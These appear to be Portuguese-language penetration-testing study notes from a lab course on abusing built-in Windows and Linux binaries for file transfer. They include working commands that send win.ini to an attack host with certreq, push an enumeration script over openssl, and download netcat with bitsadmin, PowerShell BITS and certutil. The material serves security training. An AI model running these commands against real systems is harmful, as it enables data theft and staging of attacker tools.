A frase "Viver da terra" foi cunhada por Christopher Campbell [@obscuresec](https://twitter.com/obscuresec) e Matt Graeber [@mattifestation](https://twitter.com/mattifestation) na [DerbyCon 3](https://www.youtube.com/watch?v=j-r6UonEkUw) 

O termo LOLBins (Living off the Land binaries) surgiu de uma discussão no Twitter sobre como chamar binários que um invasor pode usar para executar ações além de seu propósito original.

O termo LOLBins (Living off the Land binaries) surgiu de uma discussão no Twitter sobre como chamar binários que um invasor pode usar para executar ações além de seu propósito original.

- [Projeto LOLBAS para binários do Windows](https://lolbas-project.github.io/)
- [GTFOBins para binários Linux](https://gtfobins.github.io/)

Os binários Living off the Land podem ser usados ​​para executar funções como:

- Download
- Carregar
- Execução de Comando
- Leitura de arquivo
- Arquivo Gravar
- Desvios

Esta seção se concentrará no uso dos projetos LOLBAS e GTFOBins e fornecerá exemplos de funções de download e upload em sistemas Windows e Linux.

---
## Usando o Projeto LOLBAS e GTFOBins
[LOLBAS para Windows](https://lolbas-project.github.io/#) e [GTFOBins para Linux](https://gtfobins.github.io/) são sites onde podemos procurar binários que podemos usar para diferentes funções.

### LOLBAS
Para procurar funções de download e upload no [LOLBAS](https://lolbas-project.github.io/) podemos usar `/download`ou `/upload`.

![[Pasted image 20240826103025.png]]

Vamos usar [CertReq.exe](https://lolbas-project.github.io/lolbas/Binaries/Certreq/) como exemplo.

Precisamos escutar em uma porta em nosso host de ataque o tráfego de entrada usando o Netcat e então executar certreq.exe para carregar um arquivo.

#### Carregue win.ini para nossa Pwnbox
```cmd-session
C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```

Isso enviará o arquivo para nossa sessão ``Netcat``, e poderemos copiar e colar seu conteúdo.

#### Arquivo recebido em nossa sessão Netcat
```shell-session
NycolasES6@htb[/htb]$ sudo nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8000

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Se você receber um erro ao executar `certreq.exe`, a versão que você está usando pode não conter o parâmetro `-Post`. Você pode baixar uma versão atualizada [aqui](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) e tentar novamente.

### GTFObins
Para procurar a função de download e upload no [GTFOBins para binários Linux](https://gtfobins.github.io/) , podemos usar `+file download` ou `+file upload`.

![[Pasted image 20240826103249.png]]

Vamos usar [o OpenSSL](https://www.openssl.org/) . Ele é frequentemente instalado e frequentemente incluído em outras distribuições de software, com administradores de sistemas usando-o para gerar certificados de segurança, entre outras tarefas. O OpenSSL pode ser usado para enviar arquivos "estilo nc".

Precisamos criar um certificado e iniciar um servidor em nossa Pwnbox.

#### Crie um certificado em nossa Pwnbox
```shell-session
NycolasES6@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
```

#### Levante o servidor em nossa Pwnbox
```shell-session
NycolasES6@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Em seguida, com o servidor em execução, precisamos baixar o arquivo da máquina comprometida.

#### Baixar arquivo da máquina comprometida
```shell-session
NycolasES6@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

## Outras ferramentas comuns de Living off the Land

### Função de download do Bitsadmin
O [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) pode ser usado para baixar arquivos de sites HTTP e compartilhamentos SMB. Ele verifica "inteligentemente" a utilização do host e da rede para minimizar o impacto no trabalho de primeiro plano de um usuário.

#### Download de arquivo com Bitsadmin
```powershell-session
PS C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

O PowerShell também permite a interação com o BITS, permite downloads e uploads de arquivos, oferece suporte a credenciais e pode usar servidores proxy especificados.

#### Download
```powershell-session
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### Certutil
Casey Smith ( [@subTee](https://twitter.com/subtee?lang=en) ) descobriu que o Certutil pode ser usado para baixar arquivos arbitrários. Ele está disponível em todas as versões do Windows e tem sido uma técnica popular de transferência de arquivos, servindo como um padrão `wget`para o Windows. No entanto, a Antimalware Scan Interface (AMSI) atualmente detecta isso como uso malicioso do Certutil.

```cmd-session
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```































